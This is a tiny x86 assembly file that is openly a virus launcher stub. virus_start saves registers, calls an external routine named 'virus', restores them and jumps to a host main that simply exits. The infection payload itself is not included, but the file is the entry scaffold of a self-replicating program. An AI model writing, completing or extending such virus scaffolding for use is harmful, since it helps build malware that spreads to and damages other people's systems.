.globl virus_start,_recovery
.extern virus
.section ".text"
virus_start:	pusha
		call	virus
_recovery:	popa
		jmp	main
.section ".crtshit", "ax"
.globl main
main:		xor	%eax, %eax
		inc	%eax
		xor	%ebx, %ebx
		int	$0x80
